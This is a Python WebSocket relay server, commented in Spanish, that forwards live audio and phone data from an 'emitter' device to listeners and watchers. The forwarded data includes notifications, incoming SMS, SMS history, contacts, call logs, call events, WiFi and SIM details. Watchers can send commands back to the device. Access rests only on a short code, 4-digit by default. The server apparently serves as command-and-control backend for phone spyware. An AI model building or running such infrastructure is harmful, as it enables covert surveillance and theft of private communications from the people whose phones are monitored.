import asyncio
import aiohttp
from aiohttp import web
import os
import time
import secrets

emitters = {}
listeners = {}
watchers  = {}
last_info = {}
last_seen = {}
pending_stops = {}       # code → asyncio.Task (STOP diferido para Alpha)
pending_beta_gone = {}   # code → asyncio.Task (EMITTER_GONE diferido para Beta reconexión)


def log(code, msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}][{code}] {msg}", flush=True)


def gen_code():
    for _ in range(10000):
        code = f"{secrets.randbelow(10000):04d}"
        if code not in emitters and code not in listeners:
            return code
    raise RuntimeError("Sin codigos disponibles")


def is_valid_code(code):
    """Acepta cualquier código alfanumérico de 1–64 caracteres."""
    return bool(code) and len(code) <= 64 and all(c.isalnum() or c in '-_' for c in code)


async def safe_str(ws, msg):
    try:
        if not ws.closed:
            await ws.send_str(msg)
            return True
    except Exception as e:
        log("safe_str", f"ERROR '{msg[:30]}': {e}")
    return False


async def safe_bytes(ws, data):
    try:
        if not ws.closed:
            await ws.send_bytes(data)
            return True
    except Exception as e:
        log("safe_bytes", f"ERROR bytes: {e}")
    return False


def cancel_pending_stop(code):
    """Cancelar STOP diferido si Alpha reconectó antes del timeout."""
    task = pending_stops.pop(code, None)
    if task and not task.done():
        task.cancel()
        log(code, "STOP cancelado — Alpha reconectó a tiempo")


async def send_stop_delayed(code, delay=8.0):
    """Enviar STOP a Beta solo si Alpha no reconectó en <delay> segundos."""
    try:
        await asyncio.sleep(delay)
        # Solo mandar STOP si Alpha sigue desconectado
        alpha = listeners.get(code)
        if alpha is None or alpha.closed:
            beta = emitters.get(code)
            if beta is not None and not beta.closed:
                await safe_str(beta, "STOP")
                log(code, f"STOP enviado a Beta (Alpha no reconectó en {delay}s)")
        else:
            log(code, "STOP omitido — Alpha ya reconectó")
    except asyncio.CancelledError:
        pass  # Cancelado porque Alpha reconectó
    finally:
        pending_stops.pop(code, None)


def cancel_pending_beta_gone(code):
    """Cancelar EMITTER_GONE diferido si Beta reconectó antes del timeout."""
    task = pending_beta_gone.pop(code, None)
    if task and not task.done():
        task.cancel()
        log(code, "EMITTER_GONE cancelado — Beta reconectó a tiempo")


async def notify_emitter_gone_delayed(code, delay=5.0):
    """Enviar EMITTER_GONE a Alpha solo si Beta no reconectó en <delay> segundos.

    Período de gracia para reconexiones breves de Beta (fluctuaciones de red móvil).
    Si Beta vuelve dentro del tiempo, Alpha nunca se entera y el audio continúa.
    """
    try:
        await asyncio.sleep(delay)
        # Verificar que Beta sigue sin conectarse (ningún ws activo)
        current_beta = emitters.get(code)
        if current_beta is not None and not current_beta.closed:
            log(code, "EMITTER_GONE omitido — Beta ya reconectó")
            return
        # Beta sigue ausente → notificar a Alpha (si está en listeners)
        alpha = listeners.get(code)
        if alpha is not None and not alpha.closed:
            await safe_str(alpha, "EMITTER_GONE")
        log(code, f"EMITTER_GONE enviado a Alpha (Beta no reconectó en {delay}s)")
    except asyncio.CancelledError:
        pass  # Cancelado porque Beta reconectó
    finally:
        pending_beta_gone.pop(code, None)


async def cleanup(code, role, ws):
    log(code, f"Limpiando {role}")
    if role == "BETA":
        if emitters.get(code) is ws:
            emitters.pop(code, None)
            last_seen.pop(code, None)
            # Período de gracia: esperar 5s antes de notificar EMITTER_GONE a Alpha.
            # Si Beta reconecta en ese tiempo (común en redes móviles), Alpha no
            # se entera y el audio continúa sin ciclo JOIN→WATCH→JOIN.
            cancel_pending_beta_gone(code)
            task = asyncio.create_task(notify_emitter_gone_delayed(code, delay=5.0))
            pending_beta_gone[code] = task
            log(code, "Beta desconectado — EMITTER_GONE diferido 5s")
    elif role == "ALPHA":
        was_l = listeners.get(code) is ws
        if was_l:
            listeners.pop(code, None)
            # No mandar STOP inmediatamente — esperar 8s por si Alpha reconecta
            # (8s cubre el ciclo: 1er reintento 500ms + reintentos sucesivos < 8s)
            cancel_pending_stop(code)
            task = asyncio.create_task(send_stop_delayed(code, delay=8.0))
            pending_stops[code] = task
            log(code, "Alpha desconectado — STOP diferido 8s")
    elif role == "WATCHER":
        group = watchers.get(code)
        if group is not None:
            group.discard(ws)
            if not group:
                watchers.pop(code, None)


async def self_ping(app):
    url = os.environ.get("RAILWAY_STATIC_URL", os.environ.get("RENDER_EXTERNAL_URL", ""))
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/") + "/ping"
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        while True:
            await asyncio.sleep(240)
            try:
                async with session.get(url) as r:
                    log("SYSTEM", f"Self-ping {r.status}")
            except asyncio.CancelledError:
                raise
            except Exception as e:
                log("SYSTEM", f"Self-ping error: {e}")


async def handle_ping(request):
    return web.Response(text="Alpha-Beta Relay OK", status=200)


async def handle(request):
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)
    code = None
    role = None

    try:
        try:
            msg = await asyncio.wait_for(ws.receive(), timeout=15)
        except asyncio.TimeoutError:
            await ws.close()
            return ws

        if msg.type != aiohttp.WSMsgType.TEXT:
            await ws.close()
            return ws

        text = msg.data.strip()
        log("???", f"Primer mensaje: [{text}]")

        # ── BETA emisor ───────────────────────────────────────────────────────
        if text == "EMIT" or text.startswith("EMIT:"):
            if text.startswith("EMIT:"):
                code = text[5:].strip()
                if not is_valid_code(code):
                    # Código inválido o vacío → generar uno automáticamente
                    try:
                        code = gen_code()
                    except RuntimeError:
                        await safe_str(ws, "ERROR:NO_CODES_AVAILABLE")
                        await ws.close()
                        return ws
            else:
                try:
                    code = gen_code()
                except RuntimeError:
                    await safe_str(ws, "ERROR:NO_CODES_AVAILABLE")
                    await ws.close()
                    return ws

            role = "BETA"
            log(code, "Beta conectado")

            # Si hay un EMITTER_GONE diferido (reconexión tras caída breve), cancelarlo.
            # Esto evita que Alpha cicle cuando Beta vuelve dentro del período de gracia.
            cancel_pending_beta_gone(code)

            old = emitters.get(code)
            if old is not None and not old.closed:
                try:
                    await old.close()
                except Exception:
                    pass

            emitters[code] = ws
            last_seen[code] = time.time()
            watchers.setdefault(code, set())

            await safe_str(ws, f"CODE:{code}")
            log(code, f"CODE:{code} enviado")

            # Si Alpha ya está conectado como listener, enviar READY a Beta
            alpha = listeners.get(code)
            if alpha is not None and not alpha.closed:
                await safe_str(alpha, "OK")
                await safe_str(ws, "READY")
                log(code, "Alpha ya conectado → READY enviado a Beta")

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.BINARY:
                    last_seen[code] = time.time()
                    alpha = listeners.get(code)
                    if alpha is not None and not alpha.closed:
                        if not await safe_bytes(alpha, msg.data):
                            listeners.pop(code, None)

                elif msg.type == aiohttp.WSMsgType.TEXT:
                    txt = msg.data.strip()
                    last_seen[code] = time.time()
                    # Mensajes que van a listener Y a todos los watchers:
                    #   INFO|      → telemetría / estado del dispositivo
                    #   NOTIF|     → notificaciones de apps en Beta
                    #   CALL_EVENT|→ eventos de llamada en tiempo real
                    #   SMS_IN|    → SMS entrante en tiempo real
                    # Mensajes que van a listener Y a todos los watchers
                    BROADCAST = ("INFO|", "NOTIF|", "CALL_EVENT|", "SMS_IN|",
                                 "CONTACTS|", "SMS_HISTORY|", "CALL_LOG|",
                                 "WIFI|", "SIM|")
                    if any(txt.startswith(p) for p in BROADCAST):
                        if txt.startswith("INFO|"):
                            last_info[code] = txt
                        alpha = listeners.get(code)
                        if alpha is not None and not alpha.closed:
                            await safe_str(alpha, txt)
                        dead = set()
                        for w in list(watchers.get(code, set())):
                            if w.closed:
                                dead.add(w)
                            elif not await safe_str(w, txt):
                                dead.add(w)
                        watchers.get(code, set()).difference_update(dead)
                    else:
                        # Otros mensajes → solo al listener
                        alpha = listeners.get(code)
                        if alpha is not None and not alpha.closed:
                            await safe_str(alpha, txt)

                elif msg.type in (
                    aiohttp.WSMsgType.CLOSE,
                    aiohttp.WSMsgType.CLOSED,
                    aiohttp.WSMsgType.ERROR
                ):
                    break

        # ── ALPHA receptor ────────────────────────────────────────────────────
        elif text.startswith("JOIN:"):
            code = text[5:].strip()
            if not is_valid_code(code):
                await safe_str(ws, "ERROR:INVALID_CODE")
                await ws.close()
                return ws

            role = "ALPHA"

            # Cancelar cualquier STOP diferido previo
            cancel_pending_stop(code)

            old = listeners.get(code)
            if old is not None and not old.closed:
                try:
                    await old.close()
                except Exception:
                    pass

            # Cancelar DE NUEVO: durante el await old.close() el cleanup del
            # listener viejo pudo haber creado un nuevo timer en pending_stops.
            cancel_pending_stop(code)

            beta = emitters.get(code)
            if beta is not None and not beta.closed:
                listeners[code] = ws
                await safe_str(ws, "OK")
                await safe_str(beta, "READY")
                if code in last_info:
                    await safe_str(ws, last_info[code])
                log(code, "Alpha conectado → READY enviado a Beta")
            else:
                # Beta no disponible — cerrar inmediatamente.
                # Alpha reintentará solo (como en relay estable).
                # Sin estado pending: sin race conditions.
                await safe_str(ws, "WAITING")
                log(code, "Beta no disponible — Alpha debe reintentar")
                await ws.close()
                return ws

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    txt = msg.data.strip()
                    # No reenviar mensajes que son exclusivos del servidor
                    if txt in ("READY", "OK", "WAITING", "WATCHING", "EMITTER_GONE") or txt.startswith("CODE:") or txt.startswith("ERROR:"):
                        log(code, f"Alpha envio mensaje reservado (ignorado): {txt}")
                        continue
                    # RESUME: Alpha pide que el servidor reenvíe READY a Beta
                    # sin necesidad de desconectar y reconectar
                    if txt == "RESUME":
                        beta = emitters.get(code)
                        if beta is not None and not beta.closed:
                            await safe_str(beta, "READY")
                            log(code, "Alpha RESUME → READY enviado a Beta")
                        continue
                    beta = emitters.get(code)
                    if beta is not None and not beta.closed:
                        await safe_str(beta, txt)
                elif msg.type == aiohttp.WSMsgType.BINARY:
                    beta = emitters.get(code)
                    if beta is not None and not beta.closed:
                        await safe_bytes(beta, msg.data)
                elif msg.type in (
                    aiohttp.WSMsgType.CLOSE,
                    aiohttp.WSMsgType.CLOSED,
                    aiohttp.WSMsgType.ERROR
                ):
                    log(code, f'Alpha cierre: tipo={msg.type.name} data={msg.data!r}')
                    break

        # ── WATCHER ───────────────────────────────────────────────────────────
        elif text.startswith("WATCH:"):
            code = text[6:].strip()
            if not is_valid_code(code):
                await safe_str(ws, "ERROR:INVALID_CODE")
                await ws.close()
                return ws
            role = "WATCHER"
            watchers.setdefault(code, set()).add(ws)
            await safe_str(ws, "WATCHING")
            log(code, "Watcher conectado")
            if code in last_info:
                await safe_str(ws, last_info[code])
            beta = emitters.get(code)
            if beta is not None and not beta.closed:
                await safe_str(beta, "GET_INFO")
            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    # Comandos del watcher → reenviar a Beta
                    txt = msg.data.strip()
                    beta = emitters.get(code)
                    if beta is not None and not beta.closed:
                        await safe_str(beta, txt)
                        log(code, f"Watcher→Beta: {txt}")
                elif msg.type in (
                    aiohttp.WSMsgType.CLOSE,
                    aiohttp.WSMsgType.CLOSED,
                    aiohttp.WSMsgType.ERROR
                ):
                    break

        else:
            log("???", f"Desconocido: {text}")
            await ws.close()
            return ws

    except asyncio.CancelledError:
        raise
    except Exception as e:
        log(code or "???", f"Error [{role}]: {e}")
    finally:
        if code and role:
            try:
                await cleanup(code, role, ws)
            except Exception as e:
                log(code, f"Error limpieza: {e}")
        if not ws.closed:
            try:
                await ws.close()
            except Exception:
                pass

    return ws


async def main():
    port = int(os.environ.get("PORT", "8765"))
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/ws", handle)
    app.router.add_get("/ping", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", port).start()
    print(f"Alpha-Beta Relay corriendo en puerto {port}", flush=True)
    asyncio.ensure_future(self_ping(app))
    await asyncio.Future()


asyncio.run(main())
